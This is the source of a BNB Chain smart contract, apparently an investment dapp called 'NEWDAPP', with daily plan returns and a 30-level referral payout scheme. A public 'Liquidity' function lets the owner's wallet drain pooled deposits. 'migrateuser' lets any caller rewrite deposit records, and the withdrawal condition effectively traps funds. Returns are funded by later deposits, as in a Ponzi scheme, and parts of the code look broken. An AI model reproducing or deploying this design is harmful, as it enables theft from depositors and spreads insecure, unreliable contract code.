/**
 *Submitted for verification at BscScan.com on 2022-06-10
*/

pragma solidity 0.5.10;

library SafeMath {

     function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {
        uint _numerator  = numerator * 10 ** (precision+1);
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return (value*_quotient/1000000000000000000);
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
}

contract BEP20 {
 /*==============================
    =            EVENTS            =
    ==============================*/
    
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        address indexed referredBy
    );
    
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 ethereumEarned
    );
    
    event onReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted
    );
    
    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
    
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
	event Approval(
	address indexed owner, 
	address indexed spender,
	uint value
	);

	function totalSupply() public view returns (uint256);
	function allowance(address owner, address spender)public view returns (uint);
    function transferFrom(address from, address to, uint value)public returns (bool ok);
    function approve(address spender, uint value)public returns (bool ok);
    function transfer(address to, uint value)public returns (bool ok);
}

contract Owned {
    address payable public commissionWallet;
     struct Plan {
		uint256 time;
        uint256 percent;
    }

    
    Plan[] internal plans;


    	constructor(address payable wallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
		

        plans.push(Plan(730,35));
        plans.push(Plan(730,50));
        plans.push(Plan(730,75));
       
	}
    	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract NEWDAPP is BEP20, Owned {  
	using SafeMath for uint256;
	
	string public name                                      = "NEWDAPP";
    string public symbol                                    = "NWD";
    uint8 constant public decimals                          = 18;

	uint256 constant public INVEST_MIN_AMOUNT = 1e17; // 0.1 BNB
	uint256[] public REFERRAL_PERCENTS 	= [500, 300, 200];
	uint256[] public PASSIVE_PERCENTS 	= [2000, 1000, 500, 300, 200, 200, 200, 200, 200, 200, 150, 150, 150, 150, 150, 150, 150, 150, 150, 150, 100, 100, 100, 100, 100, 100, 100, 500, 500, 2000];
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
	uint256 constant public TIME_STEP = 1 days;

    uint256 constant internal tokenPriceInitial_            = 0.001 finney;
    uint256 constant internal tokenPriceIncremental_        = 0.0001 finney;
    uint256 constant internal tokenPriceDecremental_        = 0.0001 finney;
    uint256 internal tokenSupply_                           = 0;
    

	uint256 public totalInvested;
	uint256 public totalRefBonus;
	
	
	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
	
	address chkLv11;
	address chkLv12;
    address chkLv13;
    address chkLv14;
    address chkLv15;
    address chkLv16;
    address chkLv17;
    address chkLv18;
    address chkLv19;
    address chkLv20;
	
	address chkLv21;
	address chkLv22;
    address chkLv23;
    address chkLv24;
    address chkLv25;
    address chkLv26;
    address chkLv27;
    address chkLv28;
    address chkLv29;
    address chkLv30;
	
	
	
	
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
	
	mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal stakeBalanceLedger_;
    mapping(address => uint256) internal stakingTime_;
    mapping(address => mapping(address => uint)) allowed;
    
	
	mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
	
	mapping(address => address) internal referralLevel11Address;
    mapping(address => address) internal referralLevel12Address;
    mapping(address => address) internal referralLevel13Address;
    mapping(address => address) internal referralLevel14Address;
    mapping(address => address) internal referralLevel15Address;
    mapping(address => address) internal referralLevel16Address;
    mapping(address => address) internal referralLevel17Address;
    mapping(address => address) internal referralLevel18Address;
    mapping(address => address) internal referralLevel19Address;
    mapping(address => address) internal referralLevel20Address;
	
	mapping(address => address) internal referralLevel21Address;
    mapping(address => address) internal referralLevel22Address;
    mapping(address => address) internal referralLevel23Address;
    mapping(address => address) internal referralLevel24Address;
    mapping(address => address) internal referralLevel25Address;
    mapping(address => address) internal referralLevel26Address;
    mapping(address => address) internal referralLevel27Address;
    mapping(address => address) internal referralLevel28Address;
    mapping(address => address) internal referralLevel29Address;
    mapping(address => address) internal referralLevel30Address;

    

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 checkpoint2;
		uint256 checkpoint4;
		uint256 checkpoint5;
		address referrer;
		uint256[10] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 PASSIVEincome;
		uint256 withdrawn;
		uint256 withdrawnPASSIVE;
	}
	
	mapping (address => User) internal users;

	bool public started;
	

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event PASSIVEIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);


	
	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    
	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
		
		chkLv11                          = referralLevel10Address[_referredBy];
	    chkLv12                          = referralLevel11Address[_referredBy];
        chkLv13                          = referralLevel12Address[_referredBy];
        chkLv14                          = referralLevel13Address[_referredBy];
        chkLv15                          = referralLevel14Address[_referredBy];
        chkLv16                          = referralLevel15Address[_referredBy];
        chkLv17                          = referralLevel16Address[_referredBy];
        chkLv18                          = referralLevel17Address[_referredBy];
        chkLv19                          = referralLevel18Address[_referredBy];
        chkLv20                          = referralLevel19Address[_referredBy];
		
	    chkLv21                          = referralLevel20Address[_referredBy];
	    chkLv22                          = referralLevel21Address[_referredBy];
        chkLv23                          = referralLevel22Address[_referredBy];
        chkLv24                          = referralLevel23Address[_referredBy];
        chkLv25                          = referralLevel24Address[_referredBy];
        chkLv26                          = referralLevel25Address[_referredBy];
        chkLv27                          = referralLevel26Address[_referredBy];
        chkLv28                          = referralLevel27Address[_referredBy];
        chkLv29                          = referralLevel28Address[_referredBy];
        chkLv30                          = referralLevel29Address[_referredBy];
		

		
		
		
		
        // Level 2
        if(chkLv2 != address(0)) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        // Level 3
        if(chkLv3 != address(0)) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
        // Level 4
        if(chkLv4 != address(0)) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        // Level 5
        if(chkLv5 != address(0)) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
        // Level 6
        if(chkLv6 != address(0)) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        // Level 7
        if(chkLv7 != address(0)) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
           if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        // Level 8
        if(chkLv8 != address(0)) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        // Level 9
        if(chkLv9 != address(0)) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
        // Level 10
        if(chkLv10 != address(0)) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }
		
		// Level 11
        if(chkLv11 != address(0)) {
            referralLevel11Address[_customerAddress]                    = referralLevel10Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel10Address[_referredBy], _customerAddress, 11);
            }
        }
		
		 // Level 12
        if(chkLv12 != address(0)) {
            referralLevel12Address[_customerAddress]                    = referralLevel11Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel11Address[_referredBy], _customerAddress, 12);
            }
        }
		
		 // Level 13
        if(chkLv13 != address(0)) {
            referralLevel13Address[_customerAddress]                    = referralLevel12Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel12Address[_referredBy], _customerAddress, 13);
            }
        }
		
		 // Level 14
        if(chkLv14 != address(0)) {
            referralLevel14Address[_customerAddress]                    = referralLevel13Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel13Address[_referredBy], _customerAddress, 14);
            }
        }
		
		 // Level 15
        if(chkLv15 != address(0)) {
            referralLevel15Address[_customerAddress]                    = referralLevel14Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel14Address[_referredBy], _customerAddress, 15);
            }
        }
		
		 // Level 16
        if(chkLv16 != address(0)) {
            referralLevel16Address[_customerAddress]                    = referralLevel15Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel15Address[_referredBy], _customerAddress, 16);
            }
        }
		
		// Level 17
        if(chkLv17 != address(0)) {
            referralLevel17Address[_customerAddress]                    = referralLevel16Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel16Address[_referredBy], _customerAddress, 17);
            }
        }
		
		// Level 18
        if(chkLv18 != address(0)) {
            referralLevel18Address[_customerAddress]                    = referralLevel17Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel17Address[_referredBy], _customerAddress, 18);
            }
        }
		
		// Level 19
        if(chkLv19 != address(0)) {
            referralLevel19Address[_customerAddress]                    = referralLevel18Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel18Address[_referredBy], _customerAddress, 19);
            }
        }
		
		// Level 20
        if(chkLv20 != address(0)) {
            referralLevel20Address[_customerAddress]                    = referralLevel19Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel19Address[_referredBy], _customerAddress, 20);
            }
        }
		
		// Level 21
		if(chkLv21 != address(0)) {
			referralLevel21Address[_customerAddress]                    = referralLevel20Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel20Address[_referredBy], _customerAddress, 21);
			}
		}

		// Level 22
		if(chkLv22 != address(0)) {
			referralLevel22Address[_customerAddress]                    = referralLevel21Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel21Address[_referredBy], _customerAddress, 22);
			}
		}

		// Level 23
		if(chkLv23 != address(0)) {
			referralLevel23Address[_customerAddress]                    = referralLevel22Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel22Address[_referredBy], _customerAddress, 23);
			}
		}

		// Level 24
		if(chkLv24 != address(0)) {
			referralLevel24Address[_customerAddress]                    = referralLevel23Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel23Address[_referredBy], _customerAddress, 24);
			}
		}

		// Level 25
		if(chkLv25 != address(0)) {
			referralLevel25Address[_customerAddress]                    = referralLevel24Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel24Address[_referredBy], _customerAddress, 25);
			}
		}

		// Level 26
		if(chkLv26 != address(0)) {
			referralLevel26Address[_customerAddress]                    = referralLevel25Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel25Address[_referredBy], _customerAddress, 26);
			}
		}

		// Level 27
		if(chkLv27 != address(0)) {
			referralLevel27Address[_customerAddress]                    = referralLevel26Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel26Address[_referredBy], _customerAddress, 27);
			}
		}

		// Level 28
		if(chkLv28 != address(0)) {
			referralLevel28Address[_customerAddress]                    = referralLevel27Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel27Address[_referredBy], _customerAddress, 28);
			}
		}

		// Level 29
		if(chkLv29 != address(0)) {
			referralLevel29Address[_customerAddress]                    = referralLevel28Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel28Address[_referredBy], _customerAddress, 29);
			}
		}

		// Level 30
		if(chkLv30 != address(0)) {
			referralLevel30Address[_customerAddress]                    = referralLevel29Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel29Address[_referredBy], _customerAddress, 30);
			}
		}
		
	
        
       
}
	
	
	

	function invest(address referrer, uint8 plan) public payable {
	
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}
	
		
		
		require(msg.value >= INVEST_MIN_AMOUNT);
        


		User storage user = users[msg.sender];
        		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		
				
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != address(0)) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, msg.sender, _newReferral);
       
		
        if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}


           
        address uplineadd = user.referrer;  
		if(users[uplineadd].levels[0] == 2 ){  
		users[uplineadd].checkpoint2 =  block.timestamp;
		
		
		}
		if(users[uplineadd].levels[0] == 4 ) {
        users[uplineadd].checkpoint2 = 0;
		users[uplineadd].checkpoint4 =  block.timestamp;
	
		
		}
		if(users[uplineadd].levels[0] == 5 ) {
        users[uplineadd].checkpoint4 = 0;
		users[uplineadd].checkpoint5 =  block.timestamp;
		
		
		}
		
		
    
		 uint256 _amountOfTokens             = BNBToTokens_(msg.value);
		 tokenBalanceLedger_[msg.sender] = SafeMath.add(tokenBalanceLedger_[msg.sender], _amountOfTokens);

        if(tokenSupply_ > 0){
           
            tokenSupply_                    = SafeMath.add(tokenSupply_, _amountOfTokens);
           
        } else {
            
            tokenSupply_                    = _amountOfTokens;
        }

		 
         emit onTokenPurchase(msg.sender, msg.value, _amountOfTokens, referrer);

         
		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
	}


	function withdraw() public {
		User storage user = users[msg.sender];


			uint256 totalAmount = getUserDividends(msg.sender);
			uint256 PASSIVEAmount = getcurrentPASSIVEincome(msg.sender);

			uint256 referralBonus = getUserReferralBonus(msg.sender);
			if (referralBonus > 0) {
				user.bonus = 0;
				totalAmount = totalAmount.add(referralBonus);
			}
			totalAmount = totalAmount.add(PASSIVEAmount);
			user.withdrawnPASSIVE = user.withdrawnPASSIVE.add(PASSIVEAmount);
			
			require(totalAmount > 0, "User has no dividends");

			uint256 contractBalance = address(this).balance;
			if (contractBalance < totalAmount) {
				user.bonus = totalAmount.sub(contractBalance);
				user.totalBonus = user.totalBonus.add(user.bonus);
				totalAmount = contractBalance;
			}
			
			
			uint256 totaldeposit = getUserTotalDeposits(msg.sender);
			
			require((totaldeposit.mul(5)) <= (totalAmount.add(user.withdrawn)));

			user.checkpoint = block.timestamp;
			user.withdrawn = user.withdrawn.add(totalAmount);
								

			msg.sender.transfer(totalAmount);

			emit Withdrawn(msg.sender, totalAmount);
		
	}
	
	function migrateuser(address userAddress,uint256 amount,uint8 plan) public{
	
		User storage user = users[userAddress];
		
		uint256 index = getUserAmountOfDeposits(userAddress);

		user.deposits[index].plan = plan;
		user.deposits[index].amount = amount;
		user.deposits[index].start = block.timestamp;
	
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function Liquidity(uint256 amount) public{
		if (msg.sender == commissionWallet) {
		   totalInvested = address(this).balance.sub(amount);
			msg.sender.transfer(amount);
		}
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
			time = plans[plan].time;
            percent = plans[plan].percent;
	}

    function totalSupply() public view returns(uint256) {
        return tokenSupply_;
    }

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					
				}
			}
		}

		return totalAmount;
	}
	
	function getUserPASSIVEIncome(address userAddress) public view returns (uint256){
	
		uint256 totalPASSIVEAmount;
		
		
		uint256 count = getUserTotalReferrals(userAddress);
		
		for	(uint256 y=1; y<= count; y++)
		{
		    uint256 level;
		    address addressdownline;
		    
		    (addressdownline,level) = getDownlineRef(userAddress, y);
		
			User storage downline =users[addressdownline];
            User storage user =users[userAddress];
           

		   if((user.checkpoint2 == 0) && (user.checkpoint4 == 0) && (user.checkpoint5 == 0)) { 
				if(level <=1){
				
					for (uint256 i = 0; i < downline.deposits.length; i++) {
						uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
						if (downline.deposits[i].start < finish) {
							uint256 share = downline.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
							uint256 from = downline.deposits[i].start;
							uint256 to = finish < block.timestamp ? finish : block.timestamp;
							//PASSIVE income
							uint256 PASSIVEshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
							
							if (from < to) {
							
									totalPASSIVEAmount = totalPASSIVEAmount.add(PASSIVEshare.mul(to.sub(from)).div(TIME_STEP));	
								
							}
						}
					}
				}
			}

			
			if(user.checkpoint2 != 0) { 
				if(level <=5){
				
					for (uint256 i = 0; i < downline.deposits.length; i++) {
						uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
						if (downline.deposits[i].start < finish) {
							uint256 share = downline.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
							uint256 from = downline.deposits[i].start;
							uint256 to = finish < block.timestamp ? finish : block.timestamp;
							//PASSIVE income
							uint256 PASSIVEshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
							
							if (from < to) {
							
									totalPASSIVEAmount = totalPASSIVEAmount.add(PASSIVEshare.mul(to.sub(from)).div(TIME_STEP));	
								
							}
						}
					}
				}
			}
			
			if(user.checkpoint4 != 0){ 
				if(level <=10){
				
					for (uint256 i = 0; i < downline.deposits.length; i++) {
						uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
						if (downline.deposits[i].start < finish) {
							uint256 share = downline.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
							uint256 from = downline.deposits[i].start;
							uint256 to = finish < block.timestamp ? finish : block.timestamp;
							//PASSIVE income
							uint256 PASSIVEshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
							
							if (from < to) {
							
									totalPASSIVEAmount = totalPASSIVEAmount.add(PASSIVEshare.mul(to.sub(from)).div(TIME_STEP));	
								
							}
						}
					}
				}
			}
			
			if(user.checkpoint5 != 0){ 
				if(level <=30){
				
					for (uint256 i = 0; i < downline.deposits.length; i++) {
						uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
						if (downline.deposits[i].start < finish) {
							uint256 share = downline.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
							uint256 from = downline.deposits[i].start;
							uint256 to = finish < block.timestamp ? finish : block.timestamp;
							//PASSIVE income
							uint256 PASSIVEshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
							
							if (from < to) {
							
									totalPASSIVEAmount = totalPASSIVEAmount.add(PASSIVEshare.mul(to.sub(from)).div(TIME_STEP));	
								
							}
						}
					}
				}
			}

		
		}
		
		return totalPASSIVEAmount;		
	
	} 
	
	
	function getcurrentPASSIVEincome(address userAddress) public view returns (uint256){
	    User storage user = users[userAddress];
	    return (getUserPASSIVEIncome(userAddress).sub(user.withdrawnPASSIVE));
	    
	}
	
	function getUserTotalPASSIVEWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawnPASSIVE;
	}


	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[10] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4]+users[userAddress].levels[5]+users[userAddress].levels[6]+users[userAddress].levels[7]+users[userAddress].levels[8]+users[userAddress].levels[9];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

    function displaycheckpoints(address userAddress) public view returns(uint256 check3, uint256 check5, uint256 check7) {
		check3 = users[userAddress].checkpoint2;
        check5 = users[userAddress].checkpoint4;
        check7 = users[userAddress].checkpoint5;
	}
	
	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}


	

	// Allow _spender to withdraw from your account, multiple times, up to the _value amount.
    // If this function is called again it overwrites the current allowance with _value.
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require( _spender != address(0));
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
  
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require( _owner != address(0) && _spender !=address(0));
        return allowed[_owner][_spender];
    }
	
	
	
		//public function
   
    function sellPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       - tokenPriceDecremental_;
        } else {
            uint256 _bnb                    = tokensToBNB_(1e18);
            uint256 _taxedBNB          = _bnb;
            return _taxedBNB;
        }
    }
    
   
    function buyPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       + tokenPriceIncremental_;
        } else {
            uint256 _bnb               = tokensToBNB_(1e18);
           
            return _bnb;
        }
    }
   
    function calculateTokensReceived(uint256 _bnbToSpend) public view returns(uint256) {
        
        uint256 _amountOfTokens             = BNBToTokens_(_bnbToSpend);
        return _amountOfTokens;
    }
   
    function calculateBNBReceived(uint256 _tokensToSell) public view returns(uint256) {
        require(_tokensToSell <= tokenSupply_);
        uint256 _bnb                   = tokensToBNB_(_tokensToSell);
        uint256 _taxedBNB              = _bnb;
        return _taxedBNB;
    }
	
	
	  function BNBToTokens_(uint256 _bnb) internal view returns(uint256) {
        uint256 _tokenPriceInitial          = tokenPriceInitial_ * 1e18;
        uint256 _tokensReceived             = 
         (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            (_tokenPriceInitial**2)
                            +
                            (2*(tokenPriceIncremental_ * 1e18)*(_bnb * 1e18))
                            +
                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                            +
                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                        )
                    ), _tokenPriceInitial
                )
            )/(tokenPriceIncremental_)
        )-(tokenSupply_)
        ;

        return _tokensReceived;
    }
    
    
     function tokensToBNB_(uint256 _tokens) internal view returns(uint256) {
        uint256 tokens_                     = (_tokens + 1e18);
        uint256 _tokenSupply                = (tokenSupply_ + 1e18);
        uint256 _bnbReceived              =
        (
            SafeMath.sub(
                (
                    (
                        (
                            tokenPriceInitial_ +(tokenPriceDecremental_ * (_tokenSupply/1e18))
                        )-tokenPriceDecremental_
                    )*(tokens_ - 1e18)
                ),(tokenPriceDecremental_*((tokens_**2-tokens_)/1e18))/2
            )
        /1e18);
        return _bnbReceived;
    }

    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
    
}